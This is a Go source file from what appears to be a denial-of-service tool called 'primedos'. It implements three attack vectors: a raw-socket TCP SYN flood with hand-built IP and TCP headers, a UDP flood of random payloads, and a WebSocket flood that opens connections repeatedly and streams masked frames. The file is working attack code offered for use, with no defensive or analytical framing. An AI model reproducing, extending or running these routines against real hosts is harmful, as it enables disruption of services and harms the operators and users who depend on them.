package vectors

import (
	"bufio"
	"context"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"net"
	"time"

	"golang.org/x/sys/unix"

	"primedos/internal/core"
)

func localIPv4() net.IP {
	c, err := net.Dial("udp", "1.1.1.1:80")
	if err != nil {
		return nil
	}
	defer c.Close()
	if ua, ok := c.LocalAddr().(*net.UDPAddr); ok {
		return ua.IP.To4()
	}
	return nil
}

func checksum(b []byte) uint16 {
	var s uint32
	for i := 0; i+1 < len(b); i += 2 {
		s += uint32(b[i])<<8 | uint32(b[i+1])
	}
	if len(b)%2 == 1 {
		s += uint32(b[len(b)-1]) << 8
	}
	for s>>16 != 0 {
		s = (s & 0xffff) + (s >> 16)
	}
	return ^uint16(s)
}

func buildSYN(src, dst net.IP, sport, dport int, seq uint32) []byte {
	pkt := make([]byte, 40)

	pkt[0] = 0x45
	pkt[1] = 0
	binary.BigEndian.PutUint16(pkt[2:4], 40)
	binary.BigEndian.PutUint16(pkt[4:6], uint16(sport))
	binary.BigEndian.PutUint16(pkt[6:8], 0x4000)
	pkt[8] = 64
	pkt[9] = 6
	copy(pkt[12:16], src.To4())
	copy(pkt[16:20], dst.To4())
	binary.BigEndian.PutUint16(pkt[10:12], checksum(pkt[0:20]))

	tcp := pkt[20:40]
	binary.BigEndian.PutUint16(tcp[0:2], uint16(sport))
	binary.BigEndian.PutUint16(tcp[2:4], uint16(dport))
	binary.BigEndian.PutUint32(tcp[4:8], seq)
	binary.BigEndian.PutUint32(tcp[8:12], 0)
	tcp[12] = 5 << 4
	tcp[13] = 0x02
	binary.BigEndian.PutUint16(tcp[14:16], 65535)
	binary.BigEndian.PutUint16(tcp[16:18], 0)
	binary.BigEndian.PutUint16(tcp[18:20], 0)

	pseudo := make([]byte, 12)
	copy(pseudo[0:4], src.To4())
	copy(pseudo[4:8], dst.To4())
	pseudo[9] = 6
	binary.BigEndian.PutUint16(pseudo[10:12], 20)
	sum := checksum(append(pseudo, tcp...))
	binary.BigEndian.PutUint16(tcp[16:18], sum)

	return pkt
}

func SynFlood(ctx context.Context, w *core.Worker) error {
	fd, err := unix.Socket(unix.AF_INET, unix.SOCK_RAW, unix.IPPROTO_RAW)
	if err != nil {
		return fmt.Errorf("raw socket: %w (требуется CAP_NET_RAW/root)", err)
	}
	defer unix.Close(fd)
	if err := unix.SetsockoptInt(fd, unix.IPPROTO_IP, unix.IP_HDRINCL, 1); err != nil {
		return fmt.Errorf("IP_HDRINCL: %w", err)
	}

	dst := net.ParseIP(w.S.Tgt.IP()).To4()
	if dst == nil {
		return fmt.Errorf("нет IPv4-адреса цели")
	}
	src := localIPv4()
	if src == nil {
		return fmt.Errorf("не удалось определить локальный IPv4")
	}
	sa := &unix.SockaddrInet4{Port: w.S.Tgt.Port, Addr: [4]byte{dst[0], dst[1], dst[2], dst[3]}}

	seq := w.R.Uint32()
	for ctx.Err() == nil {
		sport := 1024 + w.R.Intn(64000)
		seq += 1 + w.R.Uint32()%100000
		pkt := buildSYN(src, dst, sport, w.S.Tgt.Port, seq)
		if err := unix.Sendto(fd, pkt, 0, sa); err != nil {
			w.Error()
			continue
		}
		w.Account(len(pkt)+20, 0, 1, 0)
	}
	return nil
}

func UDPFlood(ctx context.Context, w *core.Worker) error {
	c, err := net.Dial("udp", w.S.Tgt.Addr())
	if err != nil {
		return err
	}
	defer c.Close()
	w.Conn()

	buf := make([]byte, 1200)
	for ctx.Err() == nil {
		w.R.Read(buf)
		if _, err := c.Write(buf); err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
		}
		w.Account(len(buf)+42+8, len(buf), 1, 0)
	}
	return nil
}

func WSFlood(ctx context.Context, w *core.Worker) error {
	for ctx.Err() == nil {
		c, err := w.S.DialRaw(ctx)
		if err != nil {
			if ctx.Err() != nil {
				return nil
			}
			w.Error()
			continue
		}
		w.Conn()

		key := base64.StdEncoding.EncodeToString(randBytes(w.R, 16))
		req := fmt.Sprintf("GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: %s\r\nSec-WebSocket-Version: 13\r\n\r\n",
			w.S.RandomPath(w.R), w.S.Tgt.HostHeader(), w.S.RandomUA(w.R), key)
		if _, err := c.Write([]byte(req)); err != nil {
			c.Close()
			continue
		}
		w.Account(len(req)+core.WireOverhead(len(req)), len(req), 2, 1)

		_ = c.SetReadDeadline(time.Now().Add(5 * time.Second))
		br := bufio.NewReader(c)
		line, err := br.ReadString('\n')
		if err != nil || len(line) < 12 || line[9:12] != "101" {
			c.Close()
			continue
		}
		for {
			h, err := br.ReadString('\n')
			if err != nil || h == "\r\n" {
				break
			}
		}
		_ = c.SetReadDeadline(time.Time{})

		frame := make([]byte, 12)
		for ctx.Err() == nil {
			mask := randBytes(w.R, 4)
			payload := randBytes(w.R, 2)
			frame[0] = 0x82
			frame[1] = 0x80 | byte(len(payload))
			copy(frame[2:6], mask)
			for i := range payload {
				frame[6+i] = payload[i] ^ mask[i%4]
			}
			_ = c.SetWriteDeadline(time.Now().Add(5 * time.Second))
			if _, err := c.Write(frame[:6+len(payload)]); err != nil {
				break
			}
			w.Account(6+len(payload)+core.WireOverhead(8), 6+len(payload), 1, 1)
		}
		c.Close()
	}
	return nil
}
